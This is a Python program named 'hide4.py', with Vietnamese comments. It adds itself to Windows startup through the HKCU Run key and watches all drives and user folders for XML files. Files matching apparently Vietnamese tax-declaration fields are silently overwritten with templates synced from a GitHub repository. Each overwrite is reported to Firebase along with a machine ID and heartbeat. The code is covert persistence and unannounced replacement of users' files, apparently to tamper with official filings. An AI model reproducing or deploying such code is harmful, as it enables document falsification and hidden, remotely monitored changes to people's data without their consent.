# hide4.py

import os
import sys
import time
import glob
import json
import pickle
import shutil
import logging
import re

from pathlib import Path
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# GUI (chỉ dùng khi --gui)
try:
    import customtkinter as ctk
    from tkinter import Listbox, END, Scrollbar
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

# Registry (Startup)
try:
    import winreg
except ImportError:
    winreg = None

# --- Thư mục lưu config/log/state --- #
APP_DIR     = Path(os.getenv('APPDATA', Path.home())) / 'XMLOverwrite'
APP_DIR.mkdir(parents=True, exist_ok=True)

STATE_FILE  = APP_DIR / 'processed_files.pkl'
LOG_FILE    = APP_DIR / 'xml_overwrite.log'

# --- Logging UTF-8 vào file --- #
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(str(LOG_FILE), encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

# Import logging manager
from logging_manager import get_logger, log_performance, log_error_with_context

# Setup main logger
logger = get_logger('main')

# Import các module mới
from firebase_logger import firebase_logger
from github_storage import github_storage_sync
from machine_manager import machine_manager
from xml_fingerprint import XMLFingerprint

def add_to_startup():
    """Thêm chính EXE vào HKCU Run để auto-startup không UAC."""
    if not winreg or not getattr(sys, 'frozen', False):
        return
    exe = os.path.realpath(sys.argv[0])
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "Hide4", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        logger.info(f"✅ Đã thêm vào Startup: {exe}")
        firebase_logger.send_log("Đã thêm vào Startup", exe)
    except Exception as e:
        logger.error(f"❌ Thêm vào Startup thất bại: {e}")
        firebase_logger.send_log("Thêm vào Startup thất bại", str(e))

# Đã xóa load_remote_config() - thay bằng Telegram Bot

# Đã xóa send_gmail_log, send_googleform_log, send_remote_log - thay bằng Telegram Bot

def get_templates():
    """Lấy danh sách templates từ GitHub Storage cache"""
    try:
        # Lấy templates từ GitHub Storage cache
        templates = github_storage_sync.get_local_templates()

        if not templates:
            logger.warning("⚠️ Không tìm thấy templates trong cache")
            # Thử sync một lần nữa
            github_storage_sync.sync_templates()
            templates = github_storage_sync.get_local_templates()

        logger.info(f"📁 Tìm thấy {len(templates)} templates")
        firebase_logger.send_log("Đã cài đặt mẫu XML từ GitHub Repository", f"{len(templates)} files")

        return templates

    except Exception as e:
        logger.error(f"❌ Lỗi lấy templates: {e}")
        firebase_logger.send_log(f"Lỗi lấy templates: {str(e)}", "GitHub Storage")
        return []

def load_processed_files():
    if STATE_FILE.exists():
        with open(STATE_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_processed_files(processed):
    with open(STATE_FILE, 'wb') as f:
        pickle.dump(processed, f)

class DownloadHandler(FileSystemEventHandler):
    """Xử lý sự kiện tạo/rename file .xml để ghi đè tự động bằng XML fingerprint."""
    def __init__(self, templates_dir):
        super().__init__()
        self.templates_dir = templates_dir
        self.processed = load_processed_files()

        # Khởi tạo XML Fingerprint
        self.xml_fp = XMLFingerprint(templates_dir)
        logger.info(f"✅ Đã khởi tạo XML Fingerprint với {len(self.xml_fp.get_all_templates())} templates")

    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.xml'):
            self.try_overwrite(event.src_path)

    def on_moved(self, event):
        if not event.is_directory and event.dest_path.endswith('.xml'):
            self.try_overwrite(event.dest_path)

    def try_overwrite(self, dest):
        # Không xử lý các file nằm trong _MEIPASS/templates
        logger.debug(f"🔍 DEBUG: Analyzing file: {dest}")
        logger.debug(f"🔍 DEBUG: File exists: {os.path.exists(dest)}")
        logger.debug(f"🔍 DEBUG: File size: {os.path.getsize(dest) if os.path.exists(dest) else 'N/A'}")

        if getattr(sys, 'frozen', False):
            base = sys._MEIPASS
            tpl_dir = os.path.join(base, 'templates') + os.sep
            if dest.startswith(tpl_dir):
                return

        logger.info(f"Analyzing file: {dest}")
        
        # Sử dụng XML fingerprint để tìm template khớp
        match_result = self.xml_fp.find_matching_template(dest)
        if not match_result:
            logger.info(f"Khong tim thay template khop cho: {dest}")
            return

        template_name, template_fingerprint = match_result
        src = self.xml_fp.get_template_path(template_name)
        
        logger.info(f"Found matching template: {template_name}")
        logger.info(f"Template fingerprint: {template_fingerprint}")

        if not src:
            logger.error(f"Khong tim thay file template: {template_name}")
            return

        time.sleep(1)  # đợi file không còn bị khóa

        try:
            # Kiểm tra nội dung trước khi ghi đè
            with open(src, 'r', encoding='utf-8') as f:
                src_txt = f.read()
            with open(dest, 'r', encoding='utf-8') as f:
                dst_txt = f.read()

            logger.debug(f"🔍 Content comparison:")
            logger.debug(f"  Source length: {len(src_txt)}")
            logger.debug(f"  Destination length: {len(dst_txt)}")
            logger.debug(f"  Content match: {src_txt == dst_txt}")

            if src_txt == dst_txt:
                logger.info(f"Noi dung giong nhau, bo qua: {dest}")
                return

            # Ghi đè file
            shutil.copy(src, dest)
            
            logger.info(f"File overwritten successfully: {dest}")
            logger.info(f"Source template: {src}")

            # Tạo fingerprint cho log
            fingerprint_info = {
                'template_name': template_name,
                'mst': template_fingerprint.get('mst'),
                'maTKhai': template_fingerprint.get('maTKhai'),
                'kyKKhai': template_fingerprint.get('kyKKhai'),
                'soLan': template_fingerprint.get('soLan')
            }

            logger.info(f"Ghi de thanh cong: {src} -> {dest}")
            firebase_logger.send_log("PHAT HIEN FILE FAKE", dest, fingerprint_info)

            self.processed.add(dest)
            save_processed_files(self.processed)

        except Exception as e:
            logger.error(f"Ghi de that bai {dest}: {e}")
            logger.error(f"Exception details: {type(e).__name__}: {str(e)}")
            firebase_logger.send_log(f"Ghi de that bai: {str(e)}", dest)

def start_monitor():
    """Headless mode: tự thêm startup, log start, và giám sát toàn PC."""
    # Khởi tạo Machine Manager
    machine_manager.update_last_active()
    firebase_logger.send_log("Phần mềm Hide4 khởi chạy", f"Machine: {machine_manager.get_machine_id()}")

    # Thêm vào startup
    add_to_startup()

    # Sync templates từ GitHub Repository
    logger.info("🔄 Đồng bộ templates từ GitHub Repository...")
    github_storage_sync.sync_templates()

    # Bắt đầu auto-sync templates
    github_storage_sync.start_auto_sync()

    # Lấy templates và khởi tạo XML Fingerprint
    templates = get_templates()

    # Sử dụng cache directory từ GitHub Storage
    templates_dir = github_storage_sync.cache_dir

    # Khởi tạo handler với XML fingerprint
    handler = DownloadHandler(templates_dir)
    observer = Observer()

    # Giám sát tất cả ổ đĩa
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for d in drives:
        try:
            observer.schedule(handler, path=d, recursive=True)
            logger.info(f"✅ Monitoring drive: {d}")
        except Exception as e:
            logger.warning(f"⚠️ Cannot monitor drive {d}: {e}")
            pass

    # Giám sát thêm các thư mục quan trọng cụ thể
    important_folders = [
        str(Path.home() / "Desktop"),
        str(Path.home() / "Documents"), 
        str(Path.home() / "Downloads"),
        str(Path.home() / "OneDrive"),
        str(Path.home() / "OneDrive" / "Desktop"),
        str(Path.home() / "OneDrive" / "Documents"),
        str(Path.home() / "OneDrive" / "Downloads"),
    ]
    
    for folder in important_folders:
        if os.path.exists(folder):
            try:
                observer.schedule(handler, path=folder, recursive=True)
                logger.info(f"✅ Monitoring folder: {folder}")
            except Exception as e:
                logger.warning(f"⚠️ Cannot monitor folder {folder}: {e}")
        else:
            logger.debug(f"📁 Folder does not exist: {folder}")

    observer.start()
    firebase_logger.send_log("Bắt đầu giám sát", f"Drives: {','.join(drives)}")

    # Bắt đầu heartbeat
    machine_manager.start_heartbeat(firebase_logger)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
        machine_manager.stop_heartbeat()
        firebase_logger.send_log("Phần mềm đã tắt")
    except Exception as e:
        logger.error(f"❌ Phần mềm gặp lỗi: {e}")
        firebase_logger.send_log("Phần mềm gặp lỗi", str(e))
    observer.join()

def launch_gui():
    """GUI mode: xem templates & log (khi chạy với --gui)."""
    if not GUI_AVAILABLE:
        print("❌ GUI không khả dụng. Cần cài đặt tkinter và customtkinter.")
        return

    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("blue")
    root = ctk.CTk()
    root.title("Hide4 XML Monitor v2.0 - GUI")
    root.geometry("800x600")

    # Tạo notebook cho tabs
    notebook = ctk.CTkTabview(root)
    notebook.pack(fill='both', expand=True, padx=10, pady=10)

    # Tab 1: Templates
    templates_tab = notebook.add("📄 Templates")

    lbl_templates = ctk.CTkLabel(templates_tab, text="Danh sách XML templates:")
    lbl_templates.pack(pady=5)

    lb_tpl = Listbox(templates_tab, height=8)
    for p in get_templates():
        lb_tpl.insert(END, os.path.basename(p))
    lb_tpl.pack(fill='x', padx=10, pady=5)

    # Tab 2: Logs
    logs_tab = notebook.add("📝 Logs")

    lbl_logs = ctk.CTkLabel(logs_tab, text="Log gần nhất:")
    lbl_logs.pack(pady=5)

    lb_log = Listbox(logs_tab)
    sb = Scrollbar(logs_tab, command=lb_log.yview)
    lb_log.config(yscrollcommand=sb.set)
    lb_log.pack(side='left', fill='both', expand=True, padx=(10,0), pady=5)
    sb.pack(side='right', fill='y', pady=5)

    if LOG_FILE.exists():
        with open(LOG_FILE, encoding='utf-8') as f:
            lines = f.readlines()[-100:]
        for l in lines:
            lb_log.insert(END, l.strip())

    # Tab 3: Telegram Status
    telegram_tab = notebook.add("🤖 Telegram")

    # Machine Info
    machine_info = machine_manager.get_machine_info()
    lbl_machine = ctk.CTkLabel(telegram_tab, text=f"Machine ID: {machine_info['id']}")
    lbl_machine.pack(pady=5)

    lbl_hostname = ctk.CTkLabel(telegram_tab, text=f"Hostname: {machine_info['hostname']}")
    lbl_hostname.pack(pady=2)

    lbl_install = ctk.CTkLabel(telegram_tab, text=f"Cài đặt: {machine_info['install_date']}")
    lbl_install.pack(pady=2)

    # Firebase Status
    firebase_status = "✅ Đã cấu hình" if firebase_logger.is_configured() else "❌ Chưa cấu hình"
    lbl_firebase_status = ctk.CTkLabel(telegram_tab, text=f"Firebase Status: {firebase_status}")
    lbl_firebase_status.pack(pady=10)

    # Buttons
    btn_test_log = ctk.CTkButton(telegram_tab, text="Test gửi log",
                                command=lambda: firebase_logger.send_log("Test từ GUI", "GUI Test"))
    btn_test_log.pack(pady=5)

    btn_show_config = ctk.CTkButton(telegram_tab, text="Xem Config",
                                   command=lambda: print(f"Config file: {firebase_logger.CONFIG_FILE}"))
    btn_show_config.pack(pady=5)

    # Heartbeat Status
    heartbeat_status = "🟢 Đang chạy" if machine_info['heartbeat_running'] else "🔴 Đã dừng"
    lbl_heartbeat = ctk.CTkLabel(telegram_tab, text=f"Heartbeat: {heartbeat_status}")
    lbl_heartbeat.pack(pady=5)

    root.mainloop()

if __name__ == '__main__':
    if '--gui' in sys.argv:
        launch_gui()
    else:
        start_monitor()
if __name__ == '__main__' and '--test-log' in sys.argv:
    firebase_logger.send_log("Kiểm tra log từ Hide4", r"C:\temp\dummy.xml")
    sys.exit(0)
